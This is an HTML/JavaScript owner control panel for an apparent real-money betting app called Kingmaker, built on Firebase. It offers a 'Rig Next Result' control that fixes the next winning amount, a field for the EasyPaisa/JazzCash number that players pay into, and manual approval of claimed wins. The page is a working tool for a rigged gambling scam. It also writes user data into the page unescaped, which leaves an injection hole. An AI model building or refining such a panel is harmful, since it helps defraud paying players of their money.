<!DOCTYPE html>
<html>
<head>
    <title>Kingmaker Admin Control</title>
    <style>
        body { background: #05070a; color: white; font-family: sans-serif; padding: 20px; }
        .card { background: #1a1f2e; padding: 20px; border-radius: 15px; border: 1px solid #ffd700; margin-bottom: 20px; }
        select, input, button { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-weight: bold; }
        button { background: #ffd700; cursor: pointer; }
        .req-box { border-bottom: 1px solid #333; padding: 10px; display: flex; justify-content: space-between; align-items: center; }
    </style>
</head>
<body>
    <h1>KINGMAKER OWNER PANEL</h1>

    <div class="card">
        <h3>🎯 Rig Next Result</h3>
        <select id="rigVal">
            <option value="2">Rs. 2 (Safe)</option>
            <option value="5">Rs. 5 (Safe)</option>
            <option value="20">Rs. 20</option>
            <option value="100">Rs. 100</option>
            <option value="1000">Rs. 1000</option>
            <option value="5000">Rs. 5000</option>
        </select>
        <button onclick="setRig()">Lock This Number</button>
    </div>

    <div class="card">
        <h3>💳 Update Payment Number</h3>
        <input id="payNum" placeholder="EasyPaisa/JazzCash Number">
        <button onclick="updatePay()">Update Number</button>
    </div>

    <div class="card">
        <h3>📥 Pending Wins (Approve to add Balance)</h3>
        <div id="reqList">Loading...</div>
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, set, onValue, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = { /* Paste your Config here */ };
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.setRig = () => {
        set(ref(db, 'admin/next_result'), document.getElementById('rigVal').value);
        alert("Agla banda wahi jeetega jo aapne select kiya!");
    };

    window.updatePay = () => {
        set(ref(db, 'admin/payment_info'), document.getElementById('payNum').value);
        alert("Payment number updated!");
    };

    onValue(ref(db, 'requests'), snap => {
        const list = document.getElementById("reqList"); list.innerHTML = "";
        if(!snap.exists()) { list.innerHTML = "No requests."; return; }
        snap.forEach(c => {
            const d = c.val();
            if(d.status === 'pending') {
                list.innerHTML += `<div class="req-box">
                    <span>${d.email} (Rs.${d.amount})</span>
                    <button onclick="approve('${c.key}','${d.uid}',${d.amount})" style="width:auto; padding:5px 15px;">Approve</button>
                </div>`;
            }
        });
    });

    window.approve = async (id, uid, amt) => {
        const s = await get(ref(db, `users/${uid}/balance`));
        await update(ref(db, `users/${uid}`), { balance: (s.val() || 0) + parseFloat(amt) });
        await update(ref(db, `requests/${id}`), { status: 'approved' });
        alert("User balance updated!");
    };
</script>
</body>
</html>
